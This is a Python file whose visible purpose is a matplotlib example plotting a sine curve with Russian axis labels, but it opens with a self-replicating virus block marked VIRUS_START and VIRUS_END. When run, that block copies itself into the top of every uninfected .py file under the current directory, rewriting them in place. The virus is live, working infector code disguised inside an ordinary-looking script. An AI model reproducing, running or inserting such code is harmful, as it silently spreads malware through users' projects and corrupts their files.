## VIRUS_START
import os
def dos_w(pad):
    for root, ab, fs  in os.walk(os.getcwd()):
        for name in fs:
            if '.py' in os.path.join(root,name):
                with open(os.path.join(root,name)) as f:
                    if any(['## VIRUS_START' in line for line in f]):
                        continue
                with open(os.path.join(root,name) + '.i','w') as ifile:
                    ifile.write(pad)
                    ifile.write(open(os.path.join(root,name)).read())
                os.remove(os.path.join(root,name))
                os.rename(os.path.join(root,name) + '.i',os.path.join(root,name))
pad = ''
with open(os.path.realpath(__file__),'r') as f:
    for line in f:
        if '## VIRUS_START' == line.strip():    
            pad+=line
            break
    for line in f:
        if '## VIRUS_END' == line.strip():
            pad+=line
            break
        else: 
            pad+=line
print(pad)
dos_w(pad+'\n')
##123
## VIRUS_END     

#!/usr/bin/env pytnon
# vim: set fileencoding=utf-8 ts=4 sw=4 expandtab:

# Cyrillic letters in Matplotlib,
# thanks to Alexey for solution, see http://koldunov.net/?p=290#comments
from matplotlib import rc
rc('font',**{'family':'serif'})
rc('text', usetex=True)
# rc('text.latex',unicode=True)
rc('text.latex',preamble='\\usepackage[utf8]{inputenc}')
rc('text.latex',preamble='\\usepackage[russian]{babel}')

from pylab import *

def figsize(wcm,hcm): figure(figsize=(wcm/2.54,hcm/2.54))
figsize(13,9)

x = linspace(0,2*pi,100)
y = sin(x)
plot(x,y,'-')
xlabel(u"ось абсцисс")
ylabel(u"ось ординат")
title(u"Две беды в России — синусы и косинусы!")
savefig('rus-mpl.pdf')